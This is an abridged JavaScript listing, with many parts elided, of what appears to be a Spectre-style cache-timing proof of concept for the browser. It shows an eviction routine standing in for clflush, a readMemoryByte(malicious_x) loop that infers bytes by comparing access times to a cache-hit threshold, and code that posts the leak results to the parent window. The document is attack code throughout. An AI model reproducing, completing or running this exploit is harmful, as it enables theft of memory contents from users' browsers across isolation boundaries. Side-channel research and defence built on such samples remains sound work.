...
function asmModule(stdlib, forgein, heap) {
  ...
  function init() {
    ...
    for (i = 0; (i | 0) < 16; i = i + 1 | 0) simpleByteArray[i | 0] = (i | 0) + 1 | 0;
  ...
  function flush() {
    ...
    for (i = 256; (i | 0) < 16640; i = i + 1 | 0) current = probeTable[(i | 0) * 512 | 0] | 0;
  }
...
function check(num, data_array) {
  ...
  function clflush(size) {
    for (var i = 0; i < size / offset; i++) current = evictionView.getUint32(i * offset);
  }
  ...
  worker.onmessage = function (msg) {
    function readMemoryByte(malicious_x) {
      ...
      for (tries = 99; tries > 0; tries--) {
        ...
        for (var i = 0; i < 256; i++) {
          ...
          timeE = now();
          if (timeE - timeS <= CACHE_HIT_THRESHOLD && mix_i != simpleByteArray[tries % simpleByteArrayLength]) results[mix_i]++;
        }
    ...
    function readMemoryByteWrapper(malicious_x) {
      ...
      if (rlt[0] != 0) {
        ...
        if (com_rlt[1] == rlt[1] || com_rlt[0] == rlt[1]) return rlt[1];else if (com_rlt[0] == 0 || com_rlt[1] == 0) return com_rlt[0];else {
          return -1;
        }
      }
    }
    ...
    worker.terminate();
    parent.postMessage([match_count, data_array.length, num], "*"); // output_info_leak();
